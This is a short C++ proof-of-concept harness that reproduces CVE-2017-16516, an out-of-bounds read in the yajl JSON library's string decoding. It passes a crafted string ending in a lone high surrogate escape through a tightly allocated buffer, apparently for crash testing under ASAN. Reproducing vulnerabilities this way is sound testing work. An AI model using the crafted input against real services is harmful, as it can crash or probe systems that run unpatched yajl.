#include <cstdio>
#include <cstring>
#include <cstdlib>
extern "C" {
#include <yajl/yajl_tree.h>
}

int main() {
    // CVE-2017-16516: The vulnerability occurs when yajl_string_decode() 
    // is called with a tightly allocated buffer where a high surrogate
    // is at the very end. The code does end++ then reads str[end] and 
    // str[end+1] without bounds checking.
    
    // Create a minimal JSON with high surrogate at the end
    // The string is: ["\uD800"]
    // After parsing the \uD800, end points to the closing quote
    // Then end++ makes it point past the buffer, and str[end] reads OOB
    
    const char *json = "[\"\\uD800\"]";
    
    // Allocate tightly - just enough for the string
    size_t len = strlen(json);
    char *tight_buffer = (char*)malloc(len + 1);
    memcpy(tight_buffer, json, len);
    tight_buffer[len] = '\0';
    
    printf("Testing CVE-2017-16516 with tight buffer allocation\n");
    printf("Input: %s (length: %zu)\n", tight_buffer, len);
    
    char error_buffer[1024] = {0};
    yajl_val node = yajl_tree_parse(tight_buffer, error_buffer, sizeof(error_buffer));
    
    if (node) {
        printf("Parsed successfully (vulnerability not triggered with this allocation)\n");
        yajl_tree_free(node);
    } else {
        printf("Parse error: %s\n", error_buffer);
    }
    
    free(tight_buffer);
    
    // The actual OOB read happens inside yajl_string_decode when it processes
    // the escape sequence. With ASAN and a tight allocation, this should crash.
    
    return 0;
}
